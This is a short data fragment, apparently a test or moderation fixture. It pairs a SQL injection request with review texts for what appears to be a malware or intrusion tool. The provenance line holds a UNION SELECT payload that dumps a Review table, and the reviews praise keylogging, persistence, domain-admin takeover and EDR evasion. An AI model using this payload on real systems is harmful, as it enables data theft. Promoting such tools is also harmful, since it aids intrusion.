_provenance.via: GET /api/orders/lookup?ref=' UNION SELECT id,userId,listingId,reviewText,moderationNote,createdAt FROM Review WHERE 1=1 --

reviews.reviewText: Worth every penny. Client was shocked at how quickly we got domain admin. Stealth features are next level.
Had some issues with Windows Defender but still got persistence. Keylogger works perfectly.
Got domain admin in under 2 hours. The obfuscation completely bypassed their EDR.
